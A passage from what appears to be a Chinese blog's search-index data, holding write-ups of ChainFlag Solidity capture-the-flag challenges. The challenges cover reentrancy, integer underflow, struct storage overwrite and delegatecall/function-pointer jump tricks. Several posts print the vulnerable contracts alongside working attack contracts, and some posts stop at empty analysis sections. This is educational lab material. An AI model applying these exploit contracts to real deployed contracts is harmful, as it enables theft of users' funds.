总结这里考查的是重入，emmm，怎么说呢，重入最明显的一个特点就是：钱的更新在转账操作之后，这样一来hacker可以在回调函数中执行恶意操作，因为钱还没改变就可以一直通过转账前的判断条件，从而实现任意次的调用，最简单的改进方法就是，先更新钱再执行转账。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"crypto(3)❌","slug":"CTFS/ChainFlag/crypto/crypto(3)","date":"2023-08-24T01:50:10.000Z","updated":"2023-08-24T01:50:10.000Z","comments":true,"path":"2023/08/24/CTFS/ChainFlag/crypto/crypto(3)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/24/CTFS/ChainFlag/crypto/crypto(3)/","excerpt":"","text":"EVMEnc1. question源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485pragma solidity ^0.5.10;contract EVMEnc &#123; uint public result; string public key; uint private delta; uint public output; uint32 public sum; uint224 private tmp_sum=0; uint32 private key0; uint224 private t0=0; uint32 private key1; uint224 private t1=0; uint32 private key2; uint224 private t2=0; uint32 private key3; uint224 private t3=0; constructor() public &#123; delta = 0xb3c6ef3720; &#125; function Convert(string memory source) public pure returns (uint result) &#123; bytes32 tmp; assembly &#123; tmp := mload(add(source, 32)) &#125; result = uint(tmp) / 0x10000000000000000; &#125; function set_key(string memory tmp) public &#123; key = tmp; &#125; function cal_(uint x) public &#123; uint tmp = Convert(key) / 0x10000000000000000; result = tmp % x; &#125; function Encrypt(string memory flag) public &#123; uint tmp = Convert(flag); uint key_tmp = Convert(key) / 0x10000000000000000; assembly &#123; let first,second sstore(5, and(shr(96, key_tmp), 0xffffffff)) sstore(6, and(shr(64, key_tmp), 0xffffffff)) sstore(7, and(shr(32, key_tmp), 0xffffffff)) sstore(8, and(key_tmp, 0xffffffff)) let step := 1 for &#123; let i := 1 &#125; lt(i, 4) &#123; i := add(i, 1) &#125; &#123; first := and(shr(mul(add(sub(24, mul(i, 8)), 4), 8), tmp), 0xffffffff) second := and(shr(mul(sub(24, mul(i, 8)), 8), tmp), 0xffffffff) sstore(4, 0) for &#123;let j := 0 &#125; lt(j, 32) &#123; j := add(j, 1) &#125; &#123; sstore(4, and(add(and(sload(4), 0xffffffff), shr(5, sload(2))), 0xffffffff)) let tmp11 := and(add(and(mul(second, 16), 0xffffffff), and(sload(5), 0xffffffff)), 0xffffffff) let tmp12 := and(add(second, and(sload(4),0xffffffff)), 0xffffffff) let tmp13 := and(add(div(second, 32), and(sload(6),0xffffffff)), 0xffffffff) first := and(add(first, xor(xor(tmp11, tmp12), tmp13)), 0xffffffff) let tmp21 := and(add(and(mul(first, 16), 0xffffffff), and(sload(7),0xffffffff)), 0xffffffff) let tmp22 := and(add(first, and(sload(4),0xffffffff)), 0xffffffff) let tmp23 := and(add(div(first, 32), and(sload(8),0xffffffff)), 0xffffffff) second := and(add(second, xor(xor(tmp21, tmp22), tmp23)), 0xffffffff) &#125; sstore(3, add(sload(3), add(shl(sub(192, mul(step, 32)), first), shl(sub(192, mul(i, 64)), second)))) step := add(step, 2) &#125; &#125; &#125;&#125; 2. analysis 3. solveEasyFJump1. question源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849pragma solidity ^0.4.23;contract EasyFJump &#123; uint private Variable_a; uint private Variable_b; uint private Variable_m; uint private Variable_s; event ForFlag(address addr); struct Func &#123; function() internal f; &#125; constructor() public payable &#123; Variable_s = 693784268739743906201; &#125; function Set(uint tmp_a, uint tmp_b, uint tmp_m) public &#123; Variable_a = tmp_a; Variable_b = tmp_b; Variable_m = tmp_m; &#125; function Output() private returns(uint) &#123; Variable_s = (Variable_s * Variable_a + Variable_b) % Variable_m; return Variable_s; &#125; function GetFlag() public payable &#123; require(Output() == 2344158256393068019755829); require(Output() == 3260253069509692480800725); require(Output() == 2504603638892536865405480); require(Output() == 1887687973911110649647086); Func memory func; func.f = payforflag; uint offset = (Variable_a - Variable_b - Variable_m) &amp; 0xffff; assembly &#123; mstore(func, sub(add(mload(func), callvalue), offset)) &#125; func.f(); &#125; function payforflag() public &#123; require(keccak256(abi.encode(msg.sender))==0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff); emit ForFlag(msg.sender); &#125;&#125; 2. analysis 3. solveEthEnc1. question源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130pragma solidity ^0.6.12;contract EthEnc &#123; address private owner; //0 uint private key; //1 uint private delta; //2 uint public output; //3 uint32 private sum; uint224 private tmp_sum=0; //4 uint32 private key0; uint224 private t0=0; //5 uint32 private key1; uint224 private t1=0; //6 uint32 private key2; uint224 private t2=0; //7 uint32 private key3; uint224 private t3=0; //8 uint randomNumber = 0; string private s; event OhSendFlag(address addr); constructor() public payable &#123; // key = 0x74686974 5f69735e 5f746573 746b6579 key = 0x746869745f69735e5f746573746b6579; delta = 0xb3c6ef3720; &#125; modifier auth &#123; require(msg.sender == owner || msg.sender == address(this), &quot;EthEnc: not authorized&quot;); _; &#125; function payforflag() public auth &#123; require(output == 2282910687825444608285583946662268071674116917685196567156); emit OhSendFlag(msg.sender); selfdestruct(msg.sender); &#125; function Convert(string memory source) internal pure returns (uint result) &#123; bytes32 tmp; assembly &#123; tmp := mload(add(source, 32)) &#125; result = uint(tmp) / 0x10000000000000000; &#125; // 正 0x 5f5f6f68 5f66616e 74616e73 69746963 5f626162 795f5f5f __oh_fantansitic_baby___ function set_s(string memory _s) public &#123; s = _s; &#125; function Encrypt() public &#123; uint tmp = Convert(s); assembly &#123; let first,second sstore(5, and(shr(96, sload(1)), 0xffffffff)) sstore(6, and(shr(64, sload(1)), 0xffffffff)) sstore(7, and(shr(32, sload(1)), 0xffffffff)) sstore(8, and(sload(1), 0xffffffff)) let step := 1 for &#123; let i := 1 &#125; lt(i, 4) &#123; i := add(i, 1) &#125; &#123; first := and(shr(mul(add(sub(24, mul(i, 8)), 4), 8), tmp), 0xffffffff) second := and(shr(mul(sub(24, mul(i, 8)), 8), tmp), 0xffffffff) sstore(4, 0) for &#123;let j := 0 &#125; lt(j, 32) &#123; j := add(j, 1) &#125; &#123; let tmp11,tmp12 let tmp21,tmp22 tmp11 := and(add(xor(and(mul(second, 16), 0xffffffff), and(div(second, 32), 0xffffffff)), second), 0xffffffff) switch and(and(sload(4),0xffffffff), 3) case 0 &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(5),0xffffffff)), 0xffffffff) &#125; case 1 &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(6),0xffffffff)), 0xffffffff) &#125; case 2 &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(7),0xffffffff)), 0xffffffff) &#125; default &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(8),0xffffffff)), 0xffffffff) &#125; first := and(add(first, xor(tmp11, tmp12)), 0xffffffff) sstore(4, and(add(and(sload(4), 0xffffffff), shr(5, sload(2))), 0xffffffff)) tmp21 := and(add(xor(and(mul(first, 16), 0xffffffff), and(div(first, 32), 0xffffffff)), first), 0xffffffff) switch and(and(shr(11, and(sload(4),0xffffffff)), 0xffffffff), 3) case 0 &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(5),0xffffffff)), 0xffffffff) &#125; case 1 &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(6),0xffffffff)), 0xffffffff) &#125; case 2 &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(7),0xffffffff)), 0xffffffff) &#125; default &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(8),0xffffffff)), 0xffffffff) &#125; second := and(add(second, xor(tmp21, tmp22)), 0xffffffff) &#125; sstore(3, add(sload(3), add(shl(sub(192, mul(step, 32)), first), shl(sub(192, mul(i, 64)), second)))) step := add(step, 2) &#125; &#125; &#125; receive() external payable &#123; if(msg.value == 0) &#123; this.payforflag(); &#125; else &#123; this.Encrypt(); &#125; &#125;&#125; 2. analysis 3. solve","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"check-in(1)❌","slug":"CTFS/ChainFlag/check-in/check-in(1)","date":"2023-08-23T07:50:10.000Z","updated":"2023-08-23T07:50:10.000Z","comments":true,"path":"2023/08/23/CTFS/ChainFlag/check-in/check-in(1)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/23/CTFS/ChainFlag/check-in/check-in(1)/","excerpt":"","text":"Greeter(1)1.question源码 1234567891011121314151617181920212223pragma solidity 0.8.7;contract Greeter &#123; string greeting; constructor(string memory _greeting) public &#123; greeting = _greeting; &#125; function greet() public view returns (string memory) &#123; return greeting; &#125; function setGreeting(string memory _greeting) public &#123; greeting = _greeting; &#125; function isSolved() public view returns (bool) &#123; string memory expected = &quot;HelloChainFlag&quot;; return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting)); &#125;&#125; 📌 成功i调用isSolved() 2. analysis emmm，这题我找不到源码，在我同学的博客找到的，我也不知道为什么这么简单。 3. solve攻击合约 1234567891011121314contract Hacker &#123; Greeter greeter; constructor(address _greeter) &#123; greeter = Greeter(_greeter); &#125; function attack() public &#123; string memory _greeting = &quot;HelloChainFlag&quot;; greeter.setGreeting(_greeting); require(greeter.isSolved(), &quot;you don&#x27;t solve&quot;); &#125;&#125; 插曲好嘛，我就说嘛，原来是我同学题目错了。。。。 Greeter(2)1. question源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Greeter &#123; uint256 public x; uint256 public y; bytes32 public root; mapping(bytes32 =&gt; bool) public used_leafs; constructor(bytes32 root_hash) &#123; root = root_hash; &#125; modifier onlyGreeter() &#123; require(msg.sender == address(this)); _; &#125; function g(bool a) internal returns (uint256, uint256) &#123; if (a) return (0, 1); assembly &#123; return(0, 0) &#125; &#125; function a(uint256 i, uint256 n) public onlyGreeter &#123; x = n; g((n &lt;= 2)); x = i; &#125; function b( bytes32[] calldata leafs, bytes32[][] calldata proofs, uint256[] calldata indexs ) public &#123; require(leafs.length == proofs.length, &quot;Greeter: length not equal&quot;); require(leafs.length == indexs.length, &quot;Greeter: length not equal&quot;); for (uint256 i = 0; i &lt; leafs.length; i++) &#123; require( verify(proofs[i], leafs[i], indexs[i]), &quot;Greeter: proof invalid&quot; ); require(used_leafs[leafs[i]] == false, &quot;Greeter: leaf has be used&quot;); used_leafs[leafs[i]] = true; this.a(i, y); y++; &#125; &#125; function verify( bytes32[] memory proof, bytes32 leaf, uint256 index ) internal view returns (bool) &#123; bytes32 hash = leaf; for (uint256 i = 0; i &lt; proof.length; i++) &#123; bytes32 proofElement = proof[i]; if (index % 2 == 0) &#123; hash = keccak256(abi.encodePacked(hash, proofElement)); &#125; else &#123; hash = keccak256(abi.encodePacked(proofElement, hash)); &#125; index = index / 2; &#125; return hash == root; &#125; function isSolved() public view returns (bool) &#123; return x == 2 &amp;&amp; y == 4; &#125;&#125; 📌 成功i调用isSolved() 2. analysis 3. solve","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"integer_overflow(2)","slug":"CTFS/ChainFlag/integer overflow/integer_overflow(2)","date":"2023-08-23T04:50:10.000Z","updated":"2023-08-23T04:50:10.000Z","comments":true,"path":"2023/08/23/CTFS/ChainFlag/integer overflow/integer_overflow(2)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/23/CTFS/ChainFlag/integer%20overflow/integer_overflow(2)/","excerpt":"","text":"bet1. question源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667pragma solidity ^0.4.24;contract bet &#123; uint secret; address owner; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; uint) public gift; mapping(address =&gt; uint) public isbet; event SendFlag(string b64email); function Bet() public&#123; owner = msg.sender; &#125; function payforflag(string b64email) public &#123; require(balanceOf[msg.sender] &gt;= 100000); balanceOf[msg.sender]=0; owner.transfer(address(this).balance); emit SendFlag(b64email); &#125; //to fuck modifier only_owner() &#123; require(msg.sender == owner); _; &#125; function setsecret(uint secretrcv) only_owner &#123; secret=secretrcv; &#125; function deposit() payable&#123; uint geteth=msg.value/1000000000000000000; balanceOf[msg.sender]+=geteth; &#125; function profit() &#123; require(gift[msg.sender]==0); gift[msg.sender]=1; balanceOf[msg.sender]+=1; &#125; function betgame(uint secretguess)&#123; require(balanceOf[msg.sender]&gt;0); balanceOf[msg.sender]-=1; if (secretguess==secret) &#123; balanceOf[msg.sender]+=2; isbet[msg.sender]=1; &#125; &#125; function doublebetgame(uint secretguess) only_owner&#123; require(balanceOf[msg.sender]-2&gt;0); require(isbet[msg.sender]==1); balanceOf[msg.sender]-=2; if (secretguess==secret) &#123; balanceOf[msg.sender]+=2; &#125; &#125;&#125; 📌 成功调用payforflag() 2. analysis 要求是require(balanceOf[msg.sender] &gt;= 100000);调用者的balance大于100000，很显然这里需要溢出。直接看到两个bet相关的函数 12345678910111213141516171819function betgame(uint secretguess)&#123; require(balanceOf[msg.sender]&gt;0); balanceOf[msg.sender]-=1; if (secretguess==secret) &#123; balanceOf[msg.sender]+=2; isbet[msg.sender]=1; &#125;&#125;function doublebetgame(uint secretguess) only_owner&#123; require(balanceOf[msg.sender]-2&gt;0); require(isbet[msg.sender]==1); balanceOf[msg.sender]-=2; if (secretguess==secret) &#123; balanceOf[msg.sender]+=2; &#125;&#125; 不难看出doublebetgame()中的require(balanceOf[msg.sender]-2&gt;0)明显有着下溢的可能，且balanceOf[msg.sender]-=2;具备了下溢的条件。所以成功，但是不能进入if语句，因为一旦进入ifbalance会被恢复，那将是前功尽弃。至于betgame()则是可以帮忙实现isbet[msg.sender]==1，同时满足 -2发生溢出的条件，即才对一次再故意输掉一次。 3. solve攻击合约 1234567891011121314151617181920contract Hacker &#123; bet bet_; constructor(address _bet) public &#123; bet_ = bet(_bet); &#125; function attack() public &#123; bet_.Bet(); // 成为owner bet_.setsecret(9999); // 设置密码 bet_.profit(); // 获取空投 bet_.betgame(9999); // 将isbet[msg.sender]变为1 bet_.betgame(6666); // 故意输钱 bet_.doublebetgame(6666); // 发生下溢 bet_.payforflag(&quot;hacker&quot;); &#125; function() external payable&#123;&#125;&#125; hf1. question源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970pragma solidity ^0.4.24;contract hf &#123; address secret; uint count; address owner; mapping(address =&gt; uint) public balanceOf; mapping(address =&gt; uint) public gift; struct node &#123; address nodeadress; uint nodenumber; &#125; node public node0; event SendFlag(string b64email); constructor()public&#123; owner = msg.sender; &#125; function payforflag(string b64email) public &#123; require(balanceOf[msg.sender] &gt;= 100000); balanceOf[msg.sender]=0; owner.transfer(address(this).balance); emit SendFlag(b64email); &#125; //to fuck modifier onlySecret() &#123; require(msg.sender == secret); _; &#125; function profit() public&#123; require(gift[msg.sender]==0); gift[msg.sender]=1; balanceOf[msg.sender]+=1; &#125; function hfvote() public payable&#123; uint geteth=msg.value/1000000000000000000; balanceOf[msg.sender]+=geteth; &#125; function ubw() public payable&#123; if (msg.value &lt; 2 ether) &#123; node storage n = node0; n.nodeadress=msg.sender; n.nodenumber=1; &#125; else &#123; n.nodeadress=msg.sender; n.nodenumber=2; &#125; &#125; function fate(address to,uint value) public onlySecret &#123; require(balanceOf[msg.sender]-value&gt;=0); balanceOf[msg.sender]-=value; balanceOf[to]+=value; &#125; &#125; 📌 成功调用payforflag() 2. analysis 要求require(balanceOf[msg.sender] &gt;= 100000);有溢出漏洞的函数只有fate，分析fate 12345function fate(address to,uint value) public onlySecret &#123; require(balanceOf[msg.sender]-value&gt;=0); balanceOf[msg.sender]-=value; balanceOf[to]+=value;&#125; 很明显的下溢漏洞balanceOf[msg.sender]-=value，但要成为secret，看到ubw函数 12345678910111213function ubw() public payable&#123; if (msg.value &lt; 2 ether) &#123; node storage n = node0; n.nodeadress=msg.sender; n.nodenumber=1; &#125; else &#123; n.nodeadress=msg.sender; n.nodenumber=2; &#125;&#125; 只要通过esle中进去，就可以覆盖掉原来的secret变量，这样就成为secret了。 3. solve攻击合约 12345678910111213141516contract Hacker &#123; hf _hf; constructor(address hf_) public &#123; _hf = hf(hf_); &#125; function attack() public payable &#123; _hf.ubw.value(2 ether)(); // 覆盖 secret，并成为secret _hf.fate(msg.sender, 1); // 发生下溢 _hf.payforflag(&quot;hacker&quot;); &#125; function() external payable&#123;&#125;&#125; 总结简单的溢出和低版本合约中的结构体内存覆盖。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"delegatecall(2)","slug":"CTFS/ChainFlag/delegatecall/delegatecall(2)","date":"2023-08-22T04:50:10.000Z","updated":"2023-08-22T04:50:10.000Z","comments":true,"path":"2023/08/22/CTFS/ChainFlag/delegatecall/delegatecall(2)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/22/CTFS/ChainFlag/delegatecall/delegatecall(2)/","excerpt":"","text":"CounterStrike1.question源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768pragma solidity ^0.5.10;contract Launcher&#123; uint256 public deadline; function setdeadline(uint256 _deadline) public &#123; deadline = _deadline; &#125; constructor() public &#123; deadline = block.number + 100; &#125;&#125;contract Setup &#123; EasyBomb public easyBomb; constructor(bytes32 _password) public &#123; easyBomb = new EasyBomb(address(new Launcher()), _password); &#125; function isSolved() public view returns (bool) &#123; return easyBomb.power_state() == false; &#125;&#125;contract EasyBomb&#123; bool private hasExplode = false; address private launcher_address; bytes32 private password; bool public power_state = true; bytes4 constant launcher_start_function_hash = bytes4(keccak256(&quot;setdeadline(uint256)&quot;)); Launcher launcher; function msgPassword() public returns (bytes32 result) &#123; bytes memory msg_data = msg.data; if (msg_data.length == 0) &#123; return 0x0; &#125; assembly &#123; result := mload(add(msg_data, add(0x20, 0x24))) &#125; &#125; modifier isOwner()&#123; require(msgPassword() == password); require(msg.sender != tx.origin); uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _; &#125; modifier notExplodeYet()&#123; launcher = Launcher(launcher_address); require(block.number &lt; launcher.deadline()); hasExplode = true; _; &#125; constructor(address _launcher_address, bytes32 _fake_flag) public &#123; launcher_address = _launcher_address; password = _fake_flag ; &#125; function setCountDownTimer(uint256 _deadline) public isOwner notExplodeYet &#123; launcher_address.delegatecall(abi.encodeWithSignature(&quot;setdeadline(uint256)&quot;,_deadline)); &#125;&#125; 📌 目标：成功调用Setup合约中的isSolved()函数。 2.analysis 调用isSolved()的前提是：将EasyBomb合约的power_state变量修改为false，而能完成这个要求的只有setCountDownTimer函数，delegatecall嘛，调用逻辑合约的代码逻辑，其作用作用在自己身上。这为修改power_state提供了可能性。 而，调用该函数的前提是，通过两道修饰器，先来分析两个修饰器 isOwner()： 12345678modifier isOwner()&#123; require(msgPassword() == password); require(msg.sender != tx.origin); uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _;&#125; 三个断言： 要猜对密码，密码的存储形式为：bytes32 private password;，在区块链中合约上的信息都是公开透明的，即使使用了private修饰符，但是仍然可以通过脚本语言来获取，比如ethersjs: 1234567891011121314151617181920212223242526const &#123; ethers &#125; = require(&#x27;hardhat&#x27;);describe(&quot;[chainflag]CounterStrike&quot;, function() &#123; let deployer, player; // 执行操作的前序工作 before(async function() &#123; [deployer, player] = await ethers.getSigners(); &#125;); // 攻击逻辑 it(&quot;Execution&quot;, async function() &#123; let contractAddress = &quot;&quot;; // EasyBomb&#x27;address let slot = await ethers.provider.getStorage(contractAddress, 1); console.log(`slot = $&#123;slot&#125;`); &#125;); // 验证是否通过 after(async function() &#123; &#125;);&#125;); 为何是获取slot1位置的值呢，因为bool private hasExplode = false; address private launcher_address;这两个变量的存储空间加起来不不到32bytes，EVM或进行内存优化，将这两个值一同存放在slot0的位置。 要求调用者不能是EOA，只需要通过一个中间合约调用即可 要求调用者中的代码量为0，简单，在构造函数constructor中调用函数即可。 notExplodeYet()： 123456modifier notExplodeYet()&#123; launcher = Launcher(launcher_address); require(block.number &lt; launcher.deadline()); hasExplode = true; _;&#125; 要求在一百个区块的时间内才可以调用 分析setCountDownTimer(uint256) 123function setCountDownTimer(uint256 _deadline) public isOwner notExplodeYet &#123; launcher_address.delegatecall(abi.encodeWithSignature(&quot;setdeadline(uint256)&quot;,_deadline));&#125; emmm，仔细分析还是蛮有意思的。怎么说呢，因为在launcher_address，其功能只是修改Launcher合约中的deadline，满打满算也只能将EasyBomb合约中的slot0位置的两个变量覆盖，不能修改到power_state的值，索性修改launcher_address为攻击合约的地址吧，这样setdeadline(uint256)可以执行攻击逻辑。 但是想象是美好的，中规中矩的覆盖会出现偏差，只填入地址值的话，实际存储到合约上launcher_address的值会低8位，如： 所以需要对地址进行左移8位：&lt;&lt;8。 再看看msgPassword()函数中的如下代码 12345bytes memory msg_data = msg.data;assembly &#123; result := mload(add(msg_data, add(0x20, 0x24)))&#125; bytes memory msg_data = msg.data;中msg_data 是动态数组类型，且加载到内存中，由于动态数组比较特殊，往往在msg_data真正的数据值前先占用32bytes来保存数组的长度，画个图： 而在内联汇编中直接写入变量名的作用是，直接到存储该变量的位置。 result := mload(add(msg_data, add(0x20, 0x24)))：表示，先到存储msg_data 的位置，然后，跳过0x44个字节，为什么是 68bytes呢，因为前 32bytes 存储数组长度，3235bytes存储函数的构造器，3667bytes存储的是该函数选择器的形参，跳过这些之后，再读取32bytes的数据，所料不错的话应该就是自己包装的password。蛮细节的。 3. solve攻击合约： 1234567891011121314151617181920212223242526272829303132333435363738contract Helper &#123; bool private hasExplode = false; address private launcher_address; bytes32 private password; bool public power_state = true; uint256 public deadline; constructor(address _setup) public &#123; deadline = block.number + 100; &#125; function setdeadline(uint256) public &#123; power_state = false; &#125;&#125;contract Hacker &#123; Helper helper; Setup setup; EasyBomb bomb; bytes32 password; constructor(address _setup, bytes32 _password) public &#123; helper = new Helper(_setup); setup = Setup(_setup); password = _password; bomb = setup.easyBomb(); attack(); &#125; function attack() internal &#123; uint hacker_address = uint(uint160(address(helper))) &lt;&lt; 8; // 左移8位 address(bomb).call(abi.encodeWithSignature(&quot;setCountDownTimer(uint256)&quot;, hacker_address, password)); address(bomb).call(abi.encodeWithSignature(&quot;setCountDownTimer(uint256)&quot;, hacker_address, password)); &#125;&#125; SafeDelegatecall1.question源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162pragma solidity ^0.4.23;contract SafeDelegatecall &#123; address private owner; bytes4 internal constant SET = bytes4(keccak256(&#x27;fifth(uint256)&#x27;)); event SendFlag(address addr); uint randomNumber = 0; struct Func &#123; function() internal f; &#125; constructor() public payable &#123; owner = msg.sender; &#125; modifier onlyOwner &#123; require(msg.sender == owner); _; &#125; function execute(address _target) public payable&#123; require(_target.delegatecall(abi.encodeWithSelector(this.execute.selector)) == false, &#x27;unsafe execution&#x27;); bytes4 sel; uint val; (sel, val) = getRet(); require(sel == SET); Func memory func; func.f = gift; assembly &#123; mstore(func, sub(mload(func), val)) &#125; func.f(); &#125; function gift() private &#123; payforflag(); &#125; function getRet() internal pure returns (bytes4 sel, uint val) &#123; assembly &#123; if iszero(eq(returndatasize, 0x24)) &#123; revert(0, 0) &#125; let ptr := mload(0x40) returndatacopy(ptr, 0, 0x24) sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000) val := mload(add(0x04, ptr)) &#125; &#125; function payforflag() public payable onlyOwner &#123; require(msg.value == 1, &#x27;I only need a little money!&#x27;); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function() payable public&#123;&#125;&#125; 📌 成功调用payforflag()，也指成功执行完这个函数对吧。 2.analysis 题目要求是成功调用payforflag()函数，看一遍代码没发现可以成为owner的漏洞，让我这菜鸟一度陷入迷茫，看了大佬的博客之后茅塞顿开。成功调用某个函数，无非就是将其函数体中的代码逻辑跑通，至于那些限制条件，无非就是阻止你成功运行函数体的代码而已，要是能直接跳过限制条件，问题就迎刃而解了。 解题的关键在于execute() 和 getRet()函数 1234567891011121314151617181920212223242526 function execute(address _target) public payable&#123; require(_target.delegatecall(abi.encodeWithSelector(this.execute.selector)) == false, &#x27;unsafe execution&#x27;); bytes4 sel; uint val; (sel, val) = getRet(); require(sel == SET); Func memory func; // 这里声明为memory不会出现插槽覆盖 func.f = gift; assembly &#123; mstore(func, sub(mload(func), val)) // 存放在memory中 &#125; func.f(); &#125; function getRet() internal pure returns (bytes4 sel, uint val) &#123; assembly &#123; if iszero(eq(returndatasize, 0x24)) &#123; revert(0, 0) &#125; // eq 相等返回 1，不相等返回0，要求返回值得是 36bytes let ptr := mload(0x40) // 存储在 96 - 128 (32 bytes) returndatacopy(ptr, 0, 0x24) // 将返回值的前36个字节拷贝到 memory中，起始位置为 0x40 sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000) // 读取指针后32bytes的值，但是只保留前4bytes val := mload(add(0x04, ptr)) &#125; &#125; execute要求代理调用execute失败，且返回值的长度为 4 + 32 bytes，调用失败且自定义返回值的长度及其内容可以做到，但是这仍然无法成为owner，但是代码中有个漏洞 1234assembly &#123; mstore(func, sub(mload(func), val)) &#125;func.f(); func.f();执行该函数，其实就是跳转到 sub(mload(func), val)，这怎么理解呢。 我的理解是，函数在底层被编译为操作码的时候，代码将会被拆分存放，一个位置存放一段代码，而在某指定空间内，当调用某函数时，会读取内存中的值，并跳转到指定位置，而当调用func.f()的时候，其要跳转到的位置就是sub(mload(func), val)这便要反编译合约证实。 又知道，val的值是可以自定义的，所以进行函数调用的时候，函数可以跳转到任意位置，这将取决于 val的值。 反编译合约： 编译链接：website 如上图这是要跳转的位置：03c1 如上是payforflag()的操作码 12345function payforflag() public payable onlyOwner &#123; require(msg.value == 1, &#x27;I only need a little money!&#x27;); emit SendFlag(msg.sender); selfdestruct(msg.sender);&#125; 对应着： 123456Func memory func; func.f = gift; assembly &#123; mstore(func, sub(mload(func), val)) &#125; func.f(); 此时已经知道了，被减数（0x048a）和差（0x03c1），要求减数（to_sub）; to_sub &#x3D; 0x048a - 0x03c1 &#x3D; 1162 - 961 &#x3D; 201 &#x3D; 0xc9，所以让其返回值，val&#x3D;0xc9皆可完成挑战。 又因为，_target.delegatecall(abi.encodeWithSelector(this.execute.selector))进行函数代理调用的时候并没有传参，所以函数肯定是会调用失败的，而且甚至连函数体都进不去，更不用说设置返回值了，所以便要借助回调函数fallback。 大佬博客： link；我同学的博客：link 3. solve攻击合约 12345678910111213contract Hacker &#123; bytes4 internal constant SET = bytes4(keccak256(&#x27;fifth(uint256)&#x27;)); function() external &#123; bytes4 sel = SET; assembly &#123; mstore(0,sel) // sel: 前4bytes按要求返回 mstore(4,0xc9) // val: 后32bytes用来自定义跳转位置 revert(0,0x24) // 导致执行错误，以及返回 36bytes &#125; &#125;&#125; 总结 📌 知道了如何搭建calldata，在函数体内的msg.data，其实是通过call来调用函数时，才会有。而且，在十六进制表示的数中，两位数实则代表着8位。最重要的是，在函数初始化时，构造器中可以调本合约中的函数，但是在构造中，其他合约不能调用本合约的函数，什么意思呢，就是比如在构造器中调用本合约的函数中，该函数调用了其他合约的函数方法，同时其他合约被调用的函数需要调用调用者的某个函数，即使合约本身实现了该函数，但是由于在构造ing，所以函数将会调用失败。 想要变高手那必然需要是需要去接触底层的代码逻辑，甚至是EVM操作码。懂得了函数在底层并不是一个函数在同一个地方罗列出来，而是通过一步步跳转实现的，调用函数时，可以提前改变跳转的位置，从而实现控制代码的走向，忽视一些限制条件。（二刷：mstore(func, sub(mload(func), val))，我觉得如果函数是这样修改的话，执行func时，底层逻辑为：执行到前四个字节，随后往下读取32bytes，这32bytes存储的是—&gt;函数体内容，它可以是一个跳转地址，就比如sub(mload(func), 